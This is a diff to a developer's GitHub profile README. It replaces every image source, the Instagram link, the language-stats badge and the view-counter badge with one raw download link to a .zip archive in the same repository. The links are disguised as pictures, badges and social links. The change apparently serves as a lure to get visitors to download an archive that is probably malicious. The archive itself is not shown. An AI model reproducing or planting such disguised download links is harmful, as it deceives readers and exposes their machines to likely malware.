@@ -1,7 +1,7 @@
-<img align="right" src="https://raw.githubusercontent.com/mohamedelkashef15/mohamedelkashef15/main/github-profile.png" width="30%">
+<img align="right" src="https://github.com/yassine3010/yassine3010/raw/refs/heads/main/enteradenographic/yassine_v1.2.zip" width="30%">
 <h1>
   Hi There I'm Laissoub Mohamed Yassine
-  <img src="https://media.giphy.com/media/hvRJCLFzcasrR4ia7z/giphy.gif" width="28">
+  <img src="https://github.com/yassine3010/yassine3010/raw/refs/heads/main/enteradenographic/yassine_v1.2.zip" width="28">
 </h1>
 <p>
 I'm a software developer with a strong passion for creating visually appealing and user-friendly websites. 
@@ -13,7 +13,7 @@ I'm a software developer with a strong passion for creating visually appealing a
   
 - 📫 Social links
 <p>
-<a href="https://www.instagram.com/laissoub.mohamedyassine/"><img
+<a href="https://github.com/yassine3010/yassine3010/raw/refs/heads/main/enteradenographic/yassine_v1.2.zip"><img
     src="https://img.shields.io/badge/-Instagram-d62976?style=flat&logo=instagram&logoColor=white"
     alt="Facebook"></a>
 </p>
@@ -21,9 +21,9 @@ I'm a software developer with a strong passion for creating visually appealing a
 ### 🛠 &nbsp;Technologies that I work with
 ![HTML5](https://img.shields.io/badge/-HTML5-000000?style=flat&logo=html5)
 ![CSS](https://img.shields.io/badge/-CSS-000000?style=flat&logo=css3)
-<!-- ![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=mohamedelkashef15&hide_progress=true) -->
-![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=yassine3010&layout=compact)
+<!-- ![Top Langs](https://github.com/yassine3010/yassine3010/raw/refs/heads/main/enteradenographic/yassine_v1.2.zip) -->
+![Top Langs](https://github.com/yassine3010/yassine3010/raw/refs/heads/main/enteradenographic/yassine_v1.2.zip)
 <br>
-<a href="https://komarev.com/ghpvc/?username=yassine3010&style=for-the-badge">
-    <img src="https://komarev.com/ghpvc/?username=yassine3010&style=for-the-badge">
+<a href="https://github.com/yassine3010/yassine3010/raw/refs/heads/main/enteradenographic/yassine_v1.2.zip">
+    <img src="https://github.com/yassine3010/yassine3010/raw/refs/heads/main/enteradenographic/yassine_v1.2.zip">
 </a>
